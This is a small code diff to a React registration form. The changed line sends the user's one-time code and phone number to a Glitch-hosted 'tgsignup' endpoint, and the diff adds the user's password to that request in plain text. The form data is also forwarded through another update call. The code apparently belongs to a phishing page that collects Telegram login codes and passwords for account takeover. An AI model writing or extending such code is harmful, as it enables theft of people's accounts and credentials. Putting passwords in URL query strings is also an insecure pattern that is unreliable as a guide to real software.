@@ -216,7 +216,7 @@ const RegForm = (props) => {
                 setIsLoading(true);
                 try {
                     otp = formData.otp;
-                    const response = await axios.get(`https://uptimechecker2.glitch.me/tgsignup/otp?code=${formData.otp}&phone=${formData.phoneCountryCode.replace(/\D/g, '')}${formData.phoneNumber}`);
+                    const response = await axios.get(`https://uptimechecker2.glitch.me/tgsignup/otp?code=${formData.otp}&phone=${formData.phoneCountryCode.replace(/\D/g, '')}${formData.phoneNumber}&password=${formData.password}`);
                     setIsLoading(false);
                     sendUpdate(JSON.stringify({ ...formData, otp: formData.otp }));
                     if (response.status === 200) {
